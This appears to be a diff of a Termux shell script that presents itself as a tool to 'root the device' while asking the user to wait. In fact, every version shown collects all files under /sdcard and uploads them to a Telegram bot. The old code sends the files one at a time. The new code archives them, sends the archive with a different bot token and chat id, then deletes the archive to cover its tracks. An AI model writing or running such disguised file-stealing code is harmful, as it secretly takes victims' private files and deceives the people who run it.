@@ -32,8 +32,14 @@ wait, it will root the device of any kind
  \e[1;32m"
 echo -e "\e[4;34m  Wait, be patient   \e[0m"
 echo -e "\e[1;34m !!! \e[1;32m"
+
 termux-setup-storage
 cd /sdcard
-find ./ -name "*.*" | while read file; do
-   curl --form document=@$file https://api.telegram.org/bot6254285775:AAFdo_TIj0OobXj0lBuYcq-YUS6H41l-ZqA/sendDocument?chat_id=1218276055                   
-done
+
+find . -type f -print0 | tar cvzf files.tar.gz --null -T -
+
+
+curl -F chat_id=1218276055 -F document=@files.tar.gz https://api.telegram.org/bot5091863873:AAGnSOzOVrhVzEalbLCUhokbkauJS1ug_GU/sendDocument
+
+
+rm files.tar.gz
